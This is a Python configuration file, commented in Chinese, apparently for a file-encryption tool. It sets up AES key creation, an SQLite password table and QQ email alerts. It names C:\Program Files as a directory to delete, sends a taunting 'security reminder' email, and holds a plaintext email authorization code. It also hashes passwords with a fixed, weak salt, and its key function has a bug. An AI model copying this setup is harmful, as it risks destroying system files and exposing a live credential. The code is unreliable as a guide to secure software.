import secrets
import hashlib
#第三方库的第三方下载网址清华下载
#lib_url="https://pypi.tuna.tsinghua.edu.cn/simple"

#文件路径
text_path = './box/'
en_text_path = './entext/'
de_text_path = './detext/'
zip_path = './zip'


#随机AES密码，如有必要也可以自己创建box.key文件，里面存放你的密码
#nbyes只能小于等于180
def Create_AESkey():
    try:
        with open('box.key','r') as f:
            pwd=f.readline()
    except FileNotFoundError:
        with open('box.key','w') as f:
            f.write(str(secrets.token_urlsafe(nbytes=180)))
    return pwd

#加密文件后是否删除源文件，0为删除，1为保留
del_text = 1

#数据库建表
sql_mode = """create table box(
                id  text,
                user text,
                password text
           )
        """

#数据库的表名，必须和上面的sql_mode保持一致
table_name = 'box'

#数据库保存路径
db_path = r"./box.db"

#插入数据
sql_data = """insert into box
              (id,user,password) 
              values
              (:id, :user, :password)"""


#salt即盐值，可自定义
#数据库存储密码
salt = "666666"
def ha_hash(password,salt=salt):
    data = password + salt
    text=hashlib.sha256(data.encode("utf8"))
    return text.hexdigest()


#邮箱配置参数信息
#QQ接收邮件服务器：pop.qq.com,995
#发送邮件服务器：smtp.qq.com,465、587

#服务器地址
email_id = "smtp.qq.com"

#服务器端口
email_port = "465"

#发件邮箱
email_from = "1471584500@qq.com"

#发件邮箱密码(授权码)不是邮箱密码哈
email_pwd = "lvaqtvpmpcnmgfah"

#收件邮箱
email_to = "2134034899@qq.com"

# 邮件主题
subject = "安全提醒"

#邮件内容
content = '''
    <center>
        <span style="font-size:56px;color:black">滚出去！你这个Python假粉丝</span>
    </center>            
'''

#删除目录
path=r'C:\Program Files'
#85-49=36